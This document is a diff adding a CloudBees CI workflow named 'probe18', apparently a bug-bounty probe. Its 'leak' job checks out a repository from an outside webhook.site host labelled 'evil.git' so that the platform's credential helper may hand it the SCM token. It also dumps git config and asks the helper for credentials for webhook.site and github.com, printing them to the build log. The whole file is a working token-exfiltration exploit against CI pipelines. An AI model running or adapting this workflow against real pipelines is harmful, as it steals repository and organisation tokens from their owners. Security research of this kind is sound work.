@@ -1,0 +1,33 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe18
+
+on:
+  push:
+    branches:
+      - main
+
+permissions:
+  scm-token-own: read
+  scm-token-org: read
+
+jobs:
+  leak:
+    steps:
+      - name: checkout-attacker-host
+        uses: cloudbees-io/checkout@v1
+        continue-on-error: true
+        with:
+          repository: https://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/evil.git
+          ref: main
+      - name: manual-git-cred-probe
+        uses: docker://alpine:3.20
+        continue-on-error: true
+        run: |
+          apk add --no-cache git curl >/dev/null 2>&1
+          echo "== git config"; git config --global --list 2>&1 | head -20
+          echo "== credential helper file"; ls -la /cloudbees/bin 2>&1
+          echo "== ask helper for attacker host"
+          printf 'protocol=https\nhost=webhook.site\npath=fcf51b26-7565-4939-ae43-183e62117a14/evil.git\n\n' | /cloudbees/bin/git-credential-cloudbees get 2>&1 | head -20
+          echo "== ask helper for github.com"
+          printf 'protocol=https\nhost=github.com\npath=huntbugbounty/cb-unify-test.git\n\n' | /cloudbees/bin/git-credential-cloudbees get 2>&1 | head -20
